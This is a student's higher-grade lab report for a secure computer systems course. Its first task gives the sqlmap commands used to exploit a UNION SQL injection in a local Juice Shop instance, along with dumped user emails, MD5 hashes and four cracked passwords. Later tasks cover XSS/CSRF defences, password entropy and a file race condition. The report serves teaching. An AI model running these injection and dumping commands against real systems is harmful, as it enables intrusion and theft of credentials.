---
bibliography: refs.bib
csl: ieee.csl
link-citations: true
---
# Lab 1: Secure Computer Systems - Higher Grades

- **Date:** 19.11.2026
- **Author:** Calvin Koch
- **Course:** Secure Computer Systems I (1DT072, 11209, HT2026)
- **Lab title:** Lab 1 - Secure Computer Systems
- **Collaboration:** I worked independently.

This report contains the higher-grade exercises.

## Task 1: SQL injections - HG

### 1.1 Hash extraction and cracking

I used sqlmap to test the product-search request. The request had a `q`
parameter:

```text
http://localhost:3000/rest/products/search?q=a
```

I did not use a login cookie because this endpoint was available in the local
lab without one. The work was done in the following steps:

1. I first ran sqlmap in test mode. Sqlmap sent several specially formed
   values in `q` and compared the responses with the normal response.
2. Sqlmap found that `q` was vulnerable to a UNION injection. It found that
   the original query returned 10 columns.
3. Sqlmap checked the database type and identified SQLite.
4. I asked sqlmap to list the database tables. The list included `Users`.
5. I tried to dump the email and password columns together. That request had
   retrieval errors, so I repeated the dump one column at a time with
   `--no-cast`.
6. Sqlmap returned 24 rows from `Users`. It also recognised the password
   values as possible MD5 hashes.
7. Sqlmap tried its default dictionary against the hashes. It recovered four
   passwords. I have marked all other passwords as `not recovered` instead of
   guessing them.

In simple terms, sqlmap changes the value of `q` and watches how the server
responds. A UNION injection adds the attacker's `SELECT` result to the
original result. Sqlmap first learns how many columns are needed, then uses
the columns to ask the database for table names and values. The vulnerable
application sends those values back in its normal response, which is how
sqlmap can read them.

The sqlmap dictionary attack recovered the following passwords:

- J12934@juice-sh.op — hash `0192023a7bbd73250516f069df18b500` — password `admin123`.
- accountant@juice-sh.op — hash `e541ca7ecf72b8d1286474fc613e5e45` — password `ncc-1701`.
- john@juice-sh.op — hash `fe01ce2a7fbac8fafaed7c982a04e229` — password `demo`.
- support@juice-sh.op — hash `2c17c6393771ee3048ae34d6b380c5ec` — password `private`.

The remaining users and hashes were:

- admin@juice-sh.op — `0c36e517e3fa95aabf1bbffc6744a4ef` — not recovered.
- amy@juice-sh.op — `6edd9d726cbdc873c539e41ae8757b8c` — not recovered.
- basil@juice-sh.op — `861917d5fa5f1172f931dc700d81a8fb` — not recovered.
- bender@juice-sh.op — `3869433d74e3d0c86fd25562f836bc82` — not recovered.
- bjoern.kimminich@gmail.com — `f2f933d0bb0ba057bc8e33b8ebd6d9e8` — not recovered.
- bjoern@juice-sh.op — `b03f4b0ba8b458fa0acdc02cdb953bc8` — not recovered.
- bjoern@owasp.org — `3c2abc04e4a6ea8f1327d0aae3714b7d` — not recovered.
- chris.pike@juice-sh.op — `9ad5b0492bbe528583e128d2a8941de4` — not recovered.
- ciso@juice-sh.op — `030f05e45e30710c3ad3c32f00de0473` — not recovered.
- cloud-admin@juice-sh.op — `7f311911af16fa8f418dd1a3051d6810` — not recovered.
- demo — `9283f1b2e9669749081963be0462e466` — not recovered.
- emma@juice-sh.op — `10a783b9ed19ea1c67c3a27699f0095b` — not recovered.
- ethereum@juice-sh.op — `963e10f92a70b4b463220cb4c5d636dc` — not recovered.
- jim@juice-sh.op — `05f92148b4b60f7dacd04cceebb8f1af` — not recovered.
- mc.safesearch@juice-sh.op — `00479e957b6b42c459ee5746478e4d45` — not recovered.
- morty@juice-sh.op — `402f1c4a75e316afec5a6ea63147f739` — not recovered.
- stan@juice-sh.op — `e9048a3f43dd5e094ef733f3bd88ea64` — not recovered.
- testing@juice-sh.op — `b616a64605a07941fbd31868aea3b54b` — not recovered.
- uvogin@juice-sh.op — `127af90bb4cd56817d123db3788ab502` — not recovered.
- wurstbrot@juice-sh.op — `1d75226504523f04d2b239a7fb2990fd` — not recovered.

### 1.2 Automated SQL injection with sqlmap

I used this command to test the parameter:

```bash
sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q \
  --dbms=sqlite --technique=U --level=3 --batch
```

Sqlmap reported:

```text
Parameter: q (GET)
Type: UNION query
Title: Generic UNION query (NULL) - 10 columns
back-end DBMS: SQLite
```

I then listed the tables:

```bash
sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q \
  --dbms=sqlite --technique=U --level=3 --tables --batch
```

The database was shown as `SQLite_masterdb`, and the result included the
`Users` table.

The first dump command was:

```bash
sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q \
  --dbms=sqlite --technique=U --level=3 -T Users \
  -C email,password --dump --batch
```

This produced retrieval errors. I therefore used the following successful
command for the password column:

```bash
sqlmap -u "http://localhost:3000/rest/products/search?q=a" -p q \
  --dbms=sqlite --technique=U --level=3 -T Users -C password \
  --dump --no-cast --batch
```

The output showed 24 rows, identified possible MD5 hashes, and recovered four
passwords with the default sqlmap dictionary. The dump was also saved by
sqlmap in its local output directory.

The important options are:

* `-p q` tells sqlmap which parameter to test.
* `--technique=U` limits the test to UNION injections.
* `--dbms=sqlite` tells sqlmap which database syntax to use.
* `--level=3` makes sqlmap perform more tests than its basic level.
* `-T Users` selects the `Users` table.
* `-C password` selects the password column.
* `--dump` retrieves the selected rows.
* `--no-cast` avoids type conversions that caused problems when reading the
  values.

I did not use `--ignore-code 401`, because the endpoint did not require that
option in my documented run.

The hashes are MD5 hashes. This is supported by sqlmap's
`md5_generic_passwd` identification. They are 32 hexadecimal characters long
and do not show a separate salt. MD5 is fast and was not designed for storing
passwords, so an attacker can test many guesses quickly. A safer design would
use a new random salt for every password and a slow password-hashing function
such as Argon2id, scrypt, or bcrypt. Salting makes identical passwords produce
different stored hashes and prevents one precomputed table from working for
multiple users. Using Argon2id or a similar function makes each guessed
password expensive to test, which greatly slows offline attacks.

## Task 2: XSS/CSRF - HG

### 2.1 Protection against XSS and CSRF

#### Scenario A: XSS protected, CSRF vulnerable

XSS protection does not stop another website from sending a normal HTML form.
For example, an attacker could host a hidden form that sends a password-change
request to Juice Shop. If a logged-in victim opened that page, the browser
could include the victim's session cookie. Without an anti-CSRF token or an
origin check, the server could accept the request and change the password.
The attacker does not need JavaScript inside Juice Shop. This attack abuses
the application's trust in the victim's browser [@owasp_csrf].

#### Scenario B: CSRF protected, XSS vulnerable

An anti-CSRF token does not fix XSS. A script injected into the application's
own origin can read a token from the page and send a same-origin request with
that token. The request looks like it came from trusted application code.
The script could change account details, place an order, or read data that the
page can access. Therefore, XSS and CSRF require separate defences
[@owasp_xss; @owasp_csrf].

#### Combined protection scheme

Use output encoding to stop XSS. This means the application changes dangerous
characters in user input so they are shown as text instead of HTML or
JavaScript.

Use a Content Security Policy as an extra protection. It tells the browser
which scripts are allowed to run. If an XSS attack gets through, the browser
may block the attacker’s script.

Use a CSRF token for state-changing actions. Before a password or email can be
changed, the server gives the browser a random secret. The browser must send
that secret with the change request. An attacker on another website does not
have this secret, so the server should reject the request.

Use `SameSite` cookies where possible. This reduces the chance that the
browser sends the login cookie to the application after a cross-site request.
`HttpOnly` also stops normal JavaScript from reading the session cookie, and
`Secure` means the cookie is sent only over HTTPS.

One defence does not replace the others. Encoding and CSP stop injected
scripts, while the CSRF token and cookie settings stop unwanted requests made
by another website [@owasp_xss; @owasp_csrf; @owasp_csp].

## Task 3: Authentication - HG

### 3.1 Minimum password length according to information theory

The university policy allows 93 symbols and requires at least 27 bits of
entropy. For a uniformly random password, one symbol gives
$\log_2(93) = 6.539158811$ bits. The required length is therefore
$27 / \log_2(93) = 4.128971444$ symbols. Rounding up gives a theoretical
minimum of 5 symbols.

This is different from the calculation in the submitted report's XKCD
password section. There, the words are selected randomly from a word list,
so the calculation uses the word-list size. For example, the report gives
about 71.37 bits for four random words and about 11.99 random characters from
a 62-character alphabet. Here, the calculation instead assumes one random
choice from a 93-symbol alphabet for every position.

The 5-symbol result is only a mathematical minimum. It assumes that every
one of the 93 symbols is equally likely. Real users do not choose passwords
that way. They prefer names, words, dates, repeated characters, and simple
capitalisation. NIST explains that human-memorised secrets are not uniformly
random, so the real entropy is lower than the alphabet calculation
[@nist800632]. This is why the policy requires at least 10 symbols even
though 5 symbols are enough in the ideal random model.

### 3.2 Entropy comparison for passwords of length n and 2n

For an alphabet of 62 symbols, the entropy of a password of length $n$ is

$$E(n) = n \cdot \log_2(62).$$

The entropy of a password of length $2n$ is

$$E(2n) = 2n \cdot \log_2(62) = 2E(n).$$

Therefore, doubling the length doubles the entropy if every character is
chosen independently and randomly.

### 3.3 Brute-force search time

For ten random symbols from the 93-symbol alphabet,
$93^{10} = 48,398,230,717,929,318,249$ candidates. Dividing this number by
1,000 guesses per second gives
$48,398,230,717,929,318.249$ seconds. At 1,000 guesses per second, checking
every password would therefore take about
1,534,697,828 years, or 1.53 billion years. The average successful search
would take about 767,348,914 years, because the correct password would be
expected halfway through the search.

## Task 4: Access control - HG

Saltzer and Schroeder describe several principles for building protection
systems [@saltzer1975protection]. Economy of mechanism means keeping the
security design small and simple. A simpler design is easier to understand
and less likely to contain errors. Fail-safe defaults mean denying access by
default. Access should be granted only when the required permission is
present. Complete mediation means checking permission for every access to an
object. The system should not rely on an old check if the object or its
permissions may have changed. Least privilege means giving each program only
the permissions it needs, and no more.

### 4.1 Saltzer and Schroeder design principles

The Python program opens a file, pauses, and writes after the pause. While it
is paused, the shell changes the file or its permissions. This creates a
time-of-check to time-of-use situation: the file state at one time is not
necessarily the same at the next time.

In the permission-change test, the file is opened while writing is allowed.
The shell then removes the write bit. Python can still write because it is
using the already-open file descriptor. The permission was checked when the
file was opened, not again before the write.

In the deletion test, the shell removes the file name while Python is paused.
The open descriptor still refers to the file, so Python can finish writing.
However, a later lookup by the old pathname fails because the directory entry
is gone. This shows the difference between a file object and its name.

The program uses a file after a delay during which its permissions can change.
This relates to complete mediation because a decision made before the delay
may no longer describe the current situation. Deleting the file name does not
destroy an object that is already open. This relates to economy of mechanism
and complete mediation because the code must clearly distinguish an open
descriptor from a later pathname lookup. Opening a file without write
permission fails, which demonstrates fail-safe defaults because the operation
stops when the required permission is missing. The test program gets more
access than it needs if it can change or delete the target, so least privilege
would limit its permissions and reduce the damage from a race or bug.

The experiment mainly demonstrates the danger of separating a check from a
later use. It does not prove that every protection principle is violated.

### 4.2 Fixes, advantages, and trade-offs

The program should open the intended file once with the required access and
then use only that open descriptor. It should not check a pathname and later
open or modify the pathname again. When a new file must be created, the
program should use an atomic create/open operation with restrictive
permissions. File locks or exclusive creation can be added when concurrent
replacement must also be prevented.

This reduces the race because the write is performed on the object selected by
the successful open. The main advantage is that another process cannot change
which object the already-open descriptor refers to. The costs are more
complex code, differences between operating systems, and possible delays when
locks are used.

For a security-sensitive file, I would first use atomic open/create semantics
and descriptor-based I/O. I would add locking when the application must also
control concurrent writers. This prioritises the direct fix for the
check/use race while avoiding unnecessary locking for every operation.

## References
